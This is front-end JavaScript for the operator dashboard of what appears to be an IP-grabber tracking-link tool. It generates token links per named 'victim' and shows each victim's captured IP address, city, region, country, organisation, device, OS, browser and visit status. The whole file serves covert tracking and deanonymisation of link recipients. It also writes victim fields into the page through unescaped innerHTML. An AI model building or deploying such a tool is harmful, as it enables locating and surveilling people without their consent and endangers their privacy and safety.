async function getLink()
	{
		let victimname=document.querySelector(".victimname").value;
		let linkbox=document.querySelector(".link");	
		linkbox.value="Fetching.........";
		let body=JSON.stringify({"victimname":victimname})
		let res=await fetch("/api/link",{
											method:"post",
											headers:{"Content-Type":"application/json"},
											body:body
										}
							);
		res=await res.json();
		if(res.status=="Sucess")
		{
			linkbox.value=window.location.origin+"/token/"+res.token;
		}
		else
		{
			linkbox.value="Failed to fetch"+res.msg;
		}
	}

  	async function removeVictim(event)
	{
			let removeicon= event;
			let token=removeicon.classList[1];
			let body=JSON.stringify({"token":token});
			let res=await fetch("/api/remove",{
											method:"post",
											headers:{"Content-Type":"application/json"},
											body:body
										});
			res=await res.json();
			if(res.status=="Sucess")
			{
				alert("Sucessfully removed");
				removeicon.parentElement.parentElement.parentElement.remove();
			}
			else
			{
				alert("Sorry Failed to remove",res.msg);
			}

	}

	async function fetchVictim()
	{
		let res=await fetch("/api/get");
		res=await res.json();
		let cards=document.querySelector(".cards");
		if(res.status=="Sucess")
		{
			if(res["victimdata"].length>0)
			{
				res["victimdata"].forEach((victim)=>{
					cards.innerHTML+='<div class="card">\
							  <div class="body">\
							  	<div class="card-img">\
							  			<img src="public/img/victim.png" style="height:29px;">\
							  	</div>\
							  	<p class="victimno" style="margin:0">'+victim["victimname"]+'</p>\
								<ol class="list">\
									<li class="list_item">Ip:<span class="value">'+victim["ip"]+'</span></li>\
									<li class="list_item">City:<span class="value">'+victim["city"]+'</span></li>\
									<li class="list_item">Region:<span class="value">'+victim["region"]+'</span></li>\
									<li class="list_item">Country:<span class="value">'+victim["country"]+'</span></li>\
									<li class="list_item">Orgnaisation:<span class="value">'+victim["org"]+'</span></li>\
									<li class="list_item">Device:<span class="value">'+victim["device"]+'</span></li>\
									<li class="list_item">os:<span class="value">'+victim["os"]+'</span></li>\
									<li class="list_item">browser:<span class="value">'+victim["browser"]+'</span></li>\
									<li class="list_item">Isvisited:<span class="value">'+victim["isvisited"]+'</span></li>\
								</ol>\
								<div class="footer">\
							  	<img src="/public/img/remove.png" class="remove-icon '+victim.token+'" onclick="removeVictim(this)">\
							  </div>\
							  </div>';
				});

			}		
		}
	}

 function copyLink()
 {
 	let copytext=document.querySelector(".link");
 	copytext.select();
 	copytext.setSelectionRange(0,99999);
 	document.execCommand("copy");
 	alert("copied");
 }
	function  main() {
		fetchVictim();
		var getbutton=document.querySelector(".getlink");
		getbutton.addEventListener("click",getLink);
		var copybutton=document.querySelector(".copy-img");
		copybutton.addEventListener("click",copyLink);
	}

main()